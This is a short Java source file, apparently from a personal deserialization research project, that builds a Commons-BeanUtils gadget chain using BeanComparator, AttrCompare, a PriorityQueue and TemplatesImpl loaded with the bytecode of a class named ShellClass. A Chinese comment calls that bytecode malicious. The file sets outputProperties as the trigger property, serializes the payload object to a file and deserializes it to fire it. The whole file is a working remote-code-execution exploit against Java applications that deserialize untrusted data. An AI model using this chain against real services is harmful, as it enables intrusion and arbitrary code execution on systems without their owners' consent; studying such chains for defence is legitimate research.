package Seri.CBGadgets;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xerces.internal.dom.AttrImpl;
import com.sun.org.apache.xerces.internal.dom.AttrNSImpl;
import com.sun.org.apache.xerces.internal.dom.CoreDocumentImpl;
import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
import org.apache.commons.beanutils.BeanComparator;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

import static Seri.Utils.*;

public class CBAttrCompare {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        byte[] bytes = Files.readAllBytes(Paths.get("/Users/y1shin/IdeaProjects/Seri/target/classes/Seri/ShellClass.class"));
        setValue(templates,"_name","aaa");
        // 这里的恶意字节码 必须要使用存在的类 ，不能使用 makeClass 生成的；
        setValue(templates,"_bytecodes",new byte[][]{bytes});
        setValue(templates,"_tfactory",new TransformerFactoryImpl());

        AttrNSImpl attr = new AttrNSImpl();
        attr.setValues(new CoreDocumentImpl() ,"1" ,"1" ,"1");

        BeanComparator comparator = new BeanComparator(null ,new AttrCompare());

        PriorityQueue priorityQueue = new PriorityQueue(2,comparator);
        priorityQueue.add(attr);
        priorityQueue.add(attr);

        setValue(priorityQueue ,"queue" ,new Object[]{templates,templates});
        setValue(comparator,"property","outputProperties");

        serialize(priorityQueue ,"bin/CB2.bin");
        unserialize("bin/CB2.bin");
    }
}
